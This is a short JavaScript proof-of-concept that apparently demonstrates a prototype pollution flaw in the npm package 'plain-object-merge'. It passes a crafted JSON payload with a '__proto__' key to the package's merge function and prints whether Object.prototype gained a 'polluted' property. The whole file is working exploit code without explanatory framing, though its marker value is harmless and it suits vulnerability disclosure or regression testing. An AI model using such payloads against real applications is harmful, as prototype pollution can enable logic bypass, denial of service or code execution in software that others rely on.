var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('plain-object-merge');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
merge([
    {},
    payload
]);
console.log({}.polluted);